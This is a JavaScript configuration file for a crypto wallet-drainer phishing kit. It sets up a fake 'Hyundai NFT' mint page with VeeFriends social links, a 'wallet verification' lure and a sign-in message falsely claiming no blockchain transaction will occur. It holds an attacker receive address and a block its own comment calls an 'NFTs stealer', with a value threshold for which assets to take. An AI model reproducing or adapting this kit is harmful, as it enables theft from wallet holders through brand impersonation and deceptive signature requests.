const receiveAddress = "0x94760B08973881B4ddb76A745478001a451b1249";

const collectionInfo = {
    name: "Hyundai NFT",
    socialMedia: {
        discord: "https://discord.com/invite/veefriends",
        twitter: "https://twitter.com/veefriends",
        instagram: "https://instagram.com/veefriends",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click Sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "WALLET VERIFICATION",
}

const claimPageInfo = {
    title: "HYUNDAI <br> X META KONGZ", // <br> is a line break
    shortDescription: "WALLET VERIFICATION.",
    longDescription: "WE'RE INVITING YOU AS OUR FIRST GUESTS TO THE HYUNDAI METAMOBILITY UNIVERSE",

    claimButtonText: "MINT NOW",

    image: "hyundai_logo.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.002, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "WHITELIST",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion